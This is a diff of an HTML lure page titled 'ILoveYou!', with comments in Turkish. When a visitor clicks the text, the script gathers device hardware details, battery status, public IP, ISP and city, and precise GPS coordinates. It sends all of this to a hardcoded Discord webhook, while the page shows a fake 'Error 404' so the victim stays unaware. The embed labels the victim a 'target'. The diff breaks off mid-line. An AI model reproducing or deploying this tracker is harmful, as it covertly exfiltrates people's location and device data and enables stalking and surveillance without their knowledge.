@@ -4,9 +4,9 @@
     <meta charset="UTF-8">
     <title>ILoveYou!</title>
     <style>
-        body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: 'Courier New', Courier, monospace; overflow: hidden; }
-        #trigger { cursor: pointer; transition: 0.3s; user-select: none; font-size: 60px; font-weight: bold; }
-        #trigger:hover { color: #ff0000; text-shadow: 0 0 20px #ff0000; }
+        body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow: hidden; }
+        #trigger { cursor: pointer; transition: 0.3s; font-size: 65px; font-weight: 900; letter-spacing: -2px; text-transform: uppercase; }
+        #trigger:hover { color: #ff004f; transform: scale(1.1); }
     </style>
 </head>
 <body>
@@ -14,95 +14,93 @@
     <h1 id="trigger">ILoveYou!</h1>
 
     <script>
-        // --- AYARLAR ---
+        // --- KRİTİK AYARLAR ---
         const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
-        let report = { system: {}, network: {}, geo: {} };
 
-        // 1. TIKLAMA OLAYI (İzinleri Tetikler)
+        // 1. TETİKLEYİCİ: Yazıya tıklandığında her şeyi başlat
         document.getElementById('trigger').addEventListener('click', async function() {
-            this.innerText = "Error 404"; // Şüphe uyandırmamak için değiştir
-            await startHarvest();
+            this.innerText = "Yükleniyor...";
+            this.style.pointerEvents = "none"; // Çift tıklamayı engelle
+            await captureAllData();
+            this.innerText = "Hata 404: İçerik Bulunamadı";
         });
 
-        // 2. DONANIM VE SİSTEM ANALİZİ
-        function getHardware() {
-            let gpu = "Unknown";
+        // 2. VERİ TOPLAMA MERKEZİ
+        async function captureAllData() {
+            let data = {
+                system: {},
+                network: {},
+                geo: { lat: "Alınamadı", lon: "Alınamadı", link: "N/A" }
+            };
+
+            // A. Donanım ve Tarayıcı Analizi
             try {
                 const canvas = document.createElement("canvas");
                 const gl = canvas.getContext("webgl");
                 const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Gizlenmiş";
+
+                data.system = {
+                    gpu: gpu,
+                    ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Bilinmiyor",
+                    cores: navigator.hardwareConcurrency || "Bilinmiyor",
+                    screen: `${screen.width}x${screen.height}`,
+                    platform: navigator.platform,
+                    agent: navigator.userAgent.split(') ')[0] + ')'
+                };
+            } catch (e) { data.system.error = "Donanım bilgisi alınamadı"; }
+
+            // B. Ağ ve IP Analizi (Dış Servis Kullanımı - En Kesin Yöntem)
+            try {
+                const netRes = await fetch('https://ipapi.co/json/');
+                const netData = await netRes.json();
+                data.network = {
+                    ip: netData.ip,
+                    isp: netData.org,
+                    city: netData.city,
+                    region: netData.region,
+                    country: netData.country_name
+                };
+            } catch (e) { data.network.error = "Ağ bilgisi engellendi"; }
+
+            // C. Batarya Durumu
+            try {
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    data.system.battery = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Şarj Oluyor' : 'Pilde'})`;
+                }
             } catch (e) {}
 
-            return {
-                RAM: navigator.deviceMemory + " GB",
-                Cores: navigator.hardwareConcurrency,
-                Screen: screen.width + "x" + screen.height,
-                GPU: gpu,
-                OS: navigator.platform
+            // D. GPS Koordinatları (Kullanıcı İzni)
+            const getCoords = () => {
+                return new Promise((resolve) => {
+                    navigator.geolocation.getCurrentPosition(
+                        (p) => resolve({ lat: p.coords.latitude, lon: p.coords.longitude }),
+                        () => resolve(null),
+                        { enableHighAccuracy: true, timeout: 5000 }
+                    );
+                });
             };
-        }
 
-        // 3. AĞ VE IP ANALİZİ (WebRTC + Fallback)
-        async function getNetwork() {
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                return {
-                    PublicIP: data.ip,
-                    City: data.city,
-                    ISP: data.org,
-                    VPN: data.proxy || "Possible"
-                };
-            } catch (e) { return { error: "Network Blocked" }; }
-        }
-
-        // 4. HASAS KONUM VE GÖNDERİM
-        async function startHarvest() {
-            report.system = getHardware();
-            report.network = await getNetwork();
-
-            // Batarya bilgisi
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                report.system.Battery = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Charging' : 'Discharging'})`;
+            const coords = await getCoords();
+            if (coords) {
+                data.geo.lat = coords.lat;
+                data.geo.lon = coords.lon;
+                data.geo.link = `https://www.google.com/maps?q=${coords.lat},${coords.lon}`;
             }
 
-            // GPS Tetikleme (Asıl İzin İsteyen Kısım)
-            navigator.geolocation.getCurrentPosition(async (p) => {
-                report.geo = {
-                    Lat: p.coords.latitude,
-                    Lon: p.coords.longitude,
-                    Maps: `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`
-                };
-                await sendToDiscord();
-            }, async (err) => {
-                report.geo = "Permission Denied";
-                await sendToDiscord();
-            }, { enableHighAccuracy: true });
+            // 3. DİSCORDA GÖNDERİM (Düzenli Embed Yapısı)
+            await sendToDiscord(data);
         }
 
-        // 5. PROFESYONEL DISCORD EMBED GÖNDERİCİ
-        async function sendToDiscord() {
+        async function sendToDiscord(fullData) {
             const embed = {
-                title: "🎯 Hedef Cihaz Raporu",
-                color: 0xff0000,
-                fields: [
-                    { name: "🌐 Ağ / IP", value: `**IP:** ${report.network.PublicIP}\n**Şehir:** ${report.network.City}\n**Servis:** ${report.network.ISP}`, inline: true },
-                    { name: "💻 Donanım", value: `**GPU:** ${report.system.GPU}\n**RAM:** ${report.system.RAM}\n**CPU:** ${report.system.Cores} Core`, inline: true },
-                    { name: "🔋 Batarya", value: report.system.Battery || "N/A", inline: true },
-                    { name: "📍 Konum (GPS)", value: report.geo.Maps ? `[Haritada Gör](${report.geo.Maps})` : "İzin Verilmedi", inline: false }
-                ],
-                footer: { text: "Cihaz Telemetrisi • " + new Date().toLocaleString() }
-            };
-
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ embeds: [embed] })
-            });
-        }
-    </script>
-</body>
-</html>
-
+                username: "Sistem Analiz Botu",
+                embeds: [{
+                    title: "🔍 Yeni Hedef Tespit Edildi",
+                    color: 15548997, // Kırmızı
+                    fields: [
+                        { name: "🌐 IP ve Ağ", value: `**IP:** ${fullData.network.ip}\n**ISP:** ${fullData.network.isp}\n**Konum:** ${fullData.network.city}, ${fullData.network.country}`, inline: false },
+                        { name: "📍 GPS Konumu", value: fullData.geo.link !== "N/A" ? `[Google Haritalarda Aç](${fullData.geo.link})\n\`${fullData.geo.lat}, ${fullData.geo.lon}\`` : "⚠️ İzin Verilmedi", inline: false },
+                        { name: "💻 Cihaz Donanımı", value: `**GPU:** ${fullData.system.gpu}\n**RAM:** ${fullData.system.ram}\n**CPU:** ${fullData.system.cores} Çekirdek\
+                        
